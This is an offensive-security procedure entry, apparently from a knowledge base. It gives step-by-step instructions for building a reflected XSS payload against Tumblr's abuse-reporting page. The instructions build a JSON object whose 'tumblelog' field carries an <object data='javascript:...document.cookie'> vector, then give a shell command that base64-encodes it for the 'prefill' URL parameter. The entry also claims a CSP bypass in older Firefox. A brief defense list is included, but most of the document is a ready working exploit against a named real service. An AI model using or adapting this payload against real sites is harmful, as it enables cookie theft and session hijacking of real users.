---
tags:
  - xss
  - payload-crafting
  - json
  - base64
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/base64-encode-json]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:24.186Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: c020025b-c29b-4413-af1f-28774a5e286c
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
---

# Craft-Malicious-JSON-Payload-for-Tumblr-XSS

## Summary

This procedure crafts a malicious JSON payload targeting the 'tumblelog' field in Tumblr's abuse reporting form, embedding an XSS vector using an <object> tag with a javascript: URL, then encodes it to base64 for the 'prefill' parameter.

## Description

The Tumblr abuse page at /abuse/start decodes the base64 'prefill' parameter and reflects the JSON 'tumblelog' value directly into HTML without sanitization. This procedure creates a JSON object with null 'post', a dummy 'urlreporting', the XSS payload in 'tumblelog', and 'context' as 'blog'. The payload leverages a <object data="javascript:alert(document.cookie)"> to bypass CSP in Firefox <70. Expected outcome is a base64 string ready for URL injection, enabling JS execution or HTML injection.

## Requirements

1. Basic knowledge of JSON structure and XSS payloads
2. Access to a terminal for base64 encoding
3. Understanding of HTML5 <object> tag behavior

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and HTML entity encoding on all reflected parameters
- Enforce CSP policies blocking javascript: URLs and <object> tags
- Monitor for anomalous base64 payloads in URL parameters

## Objectives

1. Generate a valid JSON payload with embedded XSS
2. Encode payload to evade basic filters
3. Prepare for injection into Tumblr's abuse form

## Instructions

### Step 1: Construct JSON Payload

**Context**: Build the JSON object manually or via editor, ensuring the 'tumblelog' field contains the XSS vector.

No command required; example JSON:

```json
{"post":null,"urlreporting":"https://fuzzme.tumblr.com/","tumblelog":"<object data=\"javascript:alert(document.cookie)\">","context":"blog"}
```

> This JSON mimics legitimate form data while injecting the payload.

### Step 2: Encode to Base64

**Context**: Use base64 encoding to prepare the payload for the URL parameter.

**Command** ([[commands/base64-encode-json]]):
```bash
echo '{"post":null,"urlreporting":"https://fuzzme.tumblr.com/","tumblelog":"<object data=\"javascript:alert(document.cookie)\">","context":"blog"}' | base64
```

> Outputs the encoded string; verify by decoding it back to ensure integrity.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/base64-encode-json]]

## Tools Used


## Tags

- [[xss]]
- [[payload-crafting]]
- [[json]]
- [[base64]]

